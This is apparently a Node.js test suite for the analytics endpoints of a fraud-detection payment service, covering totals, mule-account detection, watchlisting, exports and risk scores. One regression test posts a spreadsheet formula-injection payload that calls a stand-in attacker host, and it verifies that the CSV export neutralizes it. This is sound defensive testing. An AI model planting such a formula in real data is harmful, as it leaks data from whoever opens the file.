// Section 15.16, Feature 18: end-to-end coverage for the analytics endpoints. Same
// freshServer/request harness as tests/newIngestionRoutes.test.js.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');

process.env.DB_PATH = ':memory:';
process.env.PORT = '0';
process.env.API_KEY = 'test-key-for-automated-tests';

function freshServer() {
  delete require.cache[require.resolve('../server/index')];
  delete require.cache[require.resolve('../server/middleware/rateLimit')];
  delete require.cache[require.resolve('../server/websocket')];
  const { app, server } = require('../server/index');
  return new Promise((resolve) => {
    if (server.listening) return resolve({ app, server });
    server.once('listening', () => resolve({ app, server }));
  });
}

function request(server, method, path, body, headerOverrides = {}) {
  return new Promise((resolve, reject) => {
    const port = server.address().port;
    const data = body ? JSON.stringify(body) : null;
    const headers = { 'Content-Type': 'application/json', 'X-API-Key': process.env.API_KEY, ...headerOverrides };
    for (const key of Object.keys(headers)) {
      if (headers[key] === undefined) delete headers[key];
    }
    const req = http.request({ host: '127.0.0.1', port, method, path, headers }, (res) => {
      let raw = '';
      res.on('data', (chunk) => (raw += chunk));
      res.on('end', () => {
        let parsed = null;
        try {
          parsed = raw ? JSON.parse(raw) : null;
        } catch {
          parsed = raw;
        }
        resolve({ status: res.statusCode, body: parsed, headers: res.headers });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

function validTransaction(overrides = {}) {
  return {
    sender_id: 'u_test_1',
    receiver_id: 'u_test_2',
    amount: 250,
    timestamp: '2026-07-18T10:15:00Z',
    device_id: 'd_test',
    merchant_id: 'm_gw_a',
    transaction_type: 'transfer',
    ...overrides,
  };
}

test('GET /analytics/summary: reflects processed transaction totals', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction());
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_test_3', receiver_id: 'u_test_4' }));

    const res = await request(server, 'GET', '/analytics/summary');
    assert.equal(res.status, 200);
    assert.equal(res.body.total_processed, 2);
    assert.equal(res.body.allowed + res.body.step_up + res.body.blocked, 2);
    assert.equal(typeof res.body.avg_latency_ms, 'number');
  } finally {
    server.close();
  }
});

test('GET /analytics/top-frauds: counts flag types across transactions', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/business-accounts', { account_id: 'm_frauds_test' });
    for (let i = 0; i < 6; i += 1) {
      await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_frauds_test', receiver_id: `u_${i}` }));
    }

    const res = await request(server, 'GET', '/analytics/top-frauds?limit=5');
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body));
    assert.ok(res.body.some((r) => r.count > 0));
  } finally {
    server.close();
  }
});

// ---- GET /analytics/fraud-signatures (Section 17, FA216) ----

test('GET /analytics/fraud-signatures: returns the full catalog, including signatures that have never fired', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/fraud-signatures');
    assert.equal(res.status, 200);
    assert.ok(res.body.length >= 27, `expected at least 27 catalog entries, got ${res.body.length}`);

    const velocity = res.body.find((s) => s.flag_type === 'velocity');
    assert.ok(velocity);
    assert.equal(velocity.occurrences, 0);
    assert.ok(velocity.description.length > 0);
    assert.ok(velocity.category.length > 0);
  } finally {
    server.close();
  }
});

test('GET /analytics/fraud-signatures: occurrences reflect real flags table counts', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/business-accounts', { account_id: 'm_signatures_test' });
    // A large payout to a receiver never paid before -- deterministically triggers
    // payout_new_receiver at MIN_OUTBOUND_HISTORY_FOR_CHECK=3, so prime that history first.
    for (let i = 0; i < 3; i += 1) {
      await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_signatures_test', receiver_id: `u_sig_known_${i}`, amount: 50 }));
    }
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_signatures_test', receiver_id: 'u_sig_new', amount: 100 }));

    const res = await request(server, 'GET', '/analytics/fraud-signatures');
    const payoutSig = res.body.find((s) => s.flag_type === 'payout_new_receiver');
    assert.ok(payoutSig.occurrences >= 1);
  } finally {
    server.close();
  }
});

test('GET /analytics/fraud-signatures requires an API key', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/fraud-signatures', null, { 'X-API-Key': undefined });
    assert.equal(res.status, 401);
  } finally {
    server.close();
  }
});

test('GET /analytics/top-risky: rejects an invalid dimension and accepts a valid one', async () => {
  const { server } = await freshServer();
  try {
    const invalid = await request(server, 'GET', '/analytics/top-risky?dimension=not_real');
    assert.equal(invalid.status, 400);

    await request(server, 'POST', '/business-accounts', { account_id: 'm_risky_test' });
    for (let i = 0; i < 6; i += 1) {
      await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_risky_test', receiver_id: `u_risky_${i}` }));
    }

    const merchants = await request(server, 'GET', '/analytics/top-risky?dimension=merchants');
    assert.equal(merchants.status, 200);
    assert.ok(merchants.body.some((r) => r.key === 'm_risky_test'));
  } finally {
    server.close();
  }
});

test('GET /analytics/mule-accounts: returns accounts with a qualifying receive-then-drain pattern', async () => {
  const { server } = await freshServer();
  try {
    // u_mule_test receives 1000 twice, draining ~90% each time within the mule window.
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_a', receiver_id: 'u_mule_test', amount: 1000, timestamp: '2026-07-18T09:00:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_mule_test', receiver_id: 'u_downstream_1', amount: 900, timestamp: '2026-07-18T09:05:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_b', receiver_id: 'u_mule_test', amount: 1000, timestamp: '2026-07-18T09:10:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_mule_test', receiver_id: 'u_downstream_2', amount: 950, timestamp: '2026-07-18T09:15:00Z' }));

    const res = await request(server, 'GET', '/analytics/mule-accounts');
    assert.equal(res.status, 200);
    assert.ok(res.body.some((r) => r.account_id === 'u_mule_test'));
  } finally {
    server.close();
  }
});

test('GET /analytics/mule-accounts: excludes the business\'s own registered accounts (regression)', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/business-accounts', { account_id: 'm_mule_exclude_test' });
    // The business account receives customer payments and pays most of it back out via
    // refunds -- ordinary operation, satisfying the generic heuristic by construction.
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_a', receiver_id: 'm_mule_exclude_test', amount: 1000, timestamp: '2026-07-18T09:00:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_mule_exclude_test', receiver_id: 'u_b', amount: 900, purpose: 'Refund', timestamp: '2026-07-18T09:05:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_c', receiver_id: 'm_mule_exclude_test', amount: 1000, timestamp: '2026-07-18T09:10:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_mule_exclude_test', receiver_id: 'u_d', amount: 950, purpose: 'Refund', timestamp: '2026-07-18T09:15:00Z' }));

    const res = await request(server, 'GET', '/analytics/mule-accounts');
    assert.equal(res.status, 200);
    assert.ok(!res.body.some((r) => r.account_id === 'm_mule_exclude_test'));
  } finally {
    server.close();
  }
});

// ---- GET /analytics/known-mules + auto-watchlist (Section 17, FA198/FA217) ----

test('POST /transaction: a confirmed mule receiver is auto-watchlisted and persisted to the known-mules registry on its next receipt', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/business-accounts', { account_id: 'm_mule_hook_a' });
    await request(server, 'POST', '/business-accounts', { account_id: 'm_mule_hook_b' });
    await request(server, 'POST', '/business-accounts', { account_id: 'm_mule_hook_c' });

    // Two full receive-then-quickly-drain cycles complete the MULE_MIN_QUALIFYING_CYCLES (2)
    // threshold. isMule is only evaluated at the moment of a *receipt* (outboundContext is only
    // computed for outbound transactions, and only the receiving side is scored here) -- so a
    // third, later receipt is what actually observes the now-qualified mule status and fires the
    // auto-watchlist/persist hook, not the withdrawal legs themselves (u_mule_hook isn't a
    // registered business account, so its own outbound withdrawals are never scored).
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_mule_hook_a', receiver_id: 'u_mule_hook', amount: 1000, timestamp: '2026-07-18T09:00:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_mule_hook', receiver_id: 'u_downstream_a', amount: 900, timestamp: '2026-07-18T09:05:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_mule_hook_b', receiver_id: 'u_mule_hook', amount: 1000, timestamp: '2026-07-18T09:10:00Z' }));
    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'u_mule_hook', receiver_id: 'u_downstream_b', amount: 950, timestamp: '2026-07-18T09:15:00Z' }));

    const beforeThirdReceipt = await request(server, 'GET', '/analytics/known-mules');
    assert.ok(!beforeThirdReceipt.body.some((r) => r.account_id === 'u_mule_hook'));

    await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_mule_hook_c', receiver_id: 'u_mule_hook', amount: 500, timestamp: '2026-07-18T09:20:00Z' }));

    const known = await request(server, 'GET', '/analytics/known-mules');
    assert.equal(known.status, 200);
    const entry = known.body.find((r) => r.account_id === 'u_mule_hook');
    assert.ok(entry, 'expected u_mule_hook in the persisted known-mules registry');
    assert.ok(entry.qualifying_cycles >= 2);

    const fraudLists = await request(server, 'GET', '/fraud-lists?list_type=watchlist');
    const watchlistEntry = fraudLists.body.find((r) => r.account_id === 'u_mule_hook');
    assert.ok(watchlistEntry, 'expected u_mule_hook to be auto-watchlisted');
    assert.match(watchlistEntry.reason, /Auto-watchlisted: confirmed mule account/);
  } finally {
    server.close();
  }
});

test('GET /analytics/known-mules requires an API key', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/known-mules', null, { 'X-API-Key': undefined });
    assert.equal(res.status, 401);
  } finally {
    server.close();
  }
});

test('GET /analytics/gateway-comparison: aggregates by merchant_id', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction({ merchant_id: 'gw_x' }));
    await request(server, 'POST', '/transaction', validTransaction({ merchant_id: 'gw_y', sender_id: 'u_5', receiver_id: 'u_6' }));

    const res = await request(server, 'GET', '/analytics/gateway-comparison');
    assert.equal(res.status, 200);
    const gateways = res.body.map((r) => r.merchant_id);
    assert.ok(gateways.includes('gw_x') && gateways.includes('gw_y'));
  } finally {
    server.close();
  }
});

test('GET /analytics/trend: buckets by the requested granularity', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction());

    const hourly = await request(server, 'GET', '/analytics/trend?bucket=hour');
    assert.equal(hourly.status, 200);
    assert.equal(hourly.body.bucket, 'hour');
    assert.ok(Array.isArray(hourly.body.buckets));

    const invalidFallsBackToDay = await request(server, 'GET', '/analytics/trend?bucket=not_real');
    assert.equal(invalidFallsBackToDay.body.bucket, 'day');
  } finally {
    server.close();
  }
});

test('GET /analytics/export: supports both json and csv formats', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction());

    const json = await request(server, 'GET', '/analytics/export?format=json');
    assert.equal(json.status, 200);
    assert.ok(Array.isArray(json.body));
    assert.ok(json.body.length >= 1);

    const csv = await request(server, 'GET', '/analytics/export?format=csv');
    assert.equal(csv.status, 200);
    assert.match(csv.headers['content-type'], /text\/csv/);
    assert.match(String(csv.body), /transaction_id,sender_id/);
  } finally {
    server.close();
  }
});

test('GET /analytics/export: neutralizes a CSV formula-injection payload in a free-text field (regression)', async () => {
  // `purpose` is free-text and attacker-controlled via POST /transaction. A leading =/+/-/@ makes
  // Excel/Sheets interpret the cell as a formula on open (e.g. a HYPERLINK() that exfiltrates
  // data), so the export must neutralize it rather than passing it through verbatim.
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction({ purpose: '=HYPERLINK("http://evil.example/?x=1","click")' }));

    const csv = await request(server, 'GET', '/analytics/export?format=csv');
    assert.equal(csv.status, 200);
    assert.doesNotMatch(String(csv.body), /,=HYPERLINK/, 'a leading = must not reach the CSV cell unescaped');
    assert.match(String(csv.body), /'=HYPERLINK/, 'expected the standard leading-quote neutralization');
  } finally {
    server.close();
  }
});

test('GET /analytics/export?format=excel: returns a real .xlsx file (Section 16, Category 18)', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/transaction', validTransaction());

    const excel = await request(server, 'GET', '/analytics/export?format=excel');
    assert.equal(excel.status, 200);
    assert.match(excel.headers['content-type'], /spreadsheetml/);
    assert.match(excel.headers['content-disposition'], /sentinelpay-export\.xlsx/);
    // ZIP files (which .xlsx always is) start with the two-byte magic "PK" -- a real smoke check
    // that this is genuinely a binary spreadsheet, not an error page or empty body. Full
    // structural validation (a valid ZIP + correct OOXML parts) is covered directly against the
    // Buffer output in tests/xlsxWriter.test.js, including cross-checking with Python's
    // independent zipfile module.
    assert.equal(String(excel.body).slice(0, 2), 'PK');
  } finally {
    server.close();
  }
});

test('analytics routes require an API key', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/summary', null, { 'X-API-Key': undefined });
    assert.equal(res.status, 401);
  } finally {
    server.close();
  }
});

// ---- GET /analytics/risk-profile (Section 16, Categories 6/7/8) ----

test('GET /analytics/risk-profile: rejects an invalid dimension or a missing id', async () => {
  const { server } = await freshServer();
  try {
    const badDimension = await request(server, 'GET', '/analytics/risk-profile?dimension=not_real&id=x');
    assert.equal(badDimension.status, 400);

    const missingId = await request(server, 'GET', '/analytics/risk-profile?dimension=merchants');
    assert.equal(missingId.status, 400);
  } finally {
    server.close();
  }
});

test('GET /analytics/risk-profile: an entity with no transaction history gets a neutral 100 health score', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/risk-profile?dimension=merchants&id=m_never_seen');
    assert.equal(res.status, 200);
    assert.equal(res.body.health_score, 100);
    assert.equal(res.body.total_transactions, 0);
    assert.equal(res.body.risk_tier, 'Low');
    assert.deepEqual(res.body.recent_transactions, []);
  } finally {
    server.close();
  }
});

test('GET /analytics/risk-profile: a merchant with a flagged payout gets a lowered health score and traceable flag detail', async () => {
  const { server } = await freshServer();
  try {
    await request(server, 'POST', '/business-accounts', { account_id: 'm_profile_test' });
    // newVendorRisk.js only activates once this business account has at least
    // MIN_OUTBOUND_HISTORY_FOR_CHECK (3) prior outbound payments -- otherwise every business's
    // very first payout would be a guaranteed false positive. Prime that history first.
    for (let i = 0; i < 3; i += 1) {
      await request(server, 'POST', '/transaction', validTransaction({ sender_id: 'm_profile_test', receiver_id: `u_known_vendor_${i}`, amount: 100 }));
    }
    // A large payout to a receiver this merchant has never paid before triggers new_vendor_risk
    // (payoutToNewReceiver.js) at step-up-or-above severity -- a real flags-table row, not just an
    // outboundRestrictor reason, so flagged_transactions/top_flag_types have something to count.
    const posted = await request(
      server,
      'POST',
      '/transaction',
      validTransaction({ sender_id: 'm_profile_test', receiver_id: 'u_new_vendor_profile', amount: 60000 })
    );
    assert.notEqual(posted.body.decision, 'allow');

    const profile = await request(server, 'GET', '/analytics/risk-profile?dimension=merchants&id=m_profile_test');
    assert.equal(profile.status, 200);
    assert.equal(profile.body.total_transactions, 4);
    assert.ok(profile.body.flagged_transactions >= 1);
    assert.ok(profile.body.health_score < 100);
    assert.notEqual(profile.body.risk_tier, undefined);
    assert.ok(profile.body.top_flag_types.some((f) => f.flag_type === 'new_vendor_risk'));
    assert.equal(profile.body.recent_transactions.length, 4);
    assert.equal(profile.body.recent_transactions[0].transaction_id, posted.body.transaction_id);
  } finally {
    server.close();
  }
});

test('GET /analytics/risk-profile requires an API key', async () => {
  const { server } = await freshServer();
  try {
    const res = await request(server, 'GET', '/analytics/risk-profile?dimension=merchants&id=x', null, { 'X-API-Key': undefined });
    assert.equal(res.status, 401);
  } finally {
    server.close();
  }
});
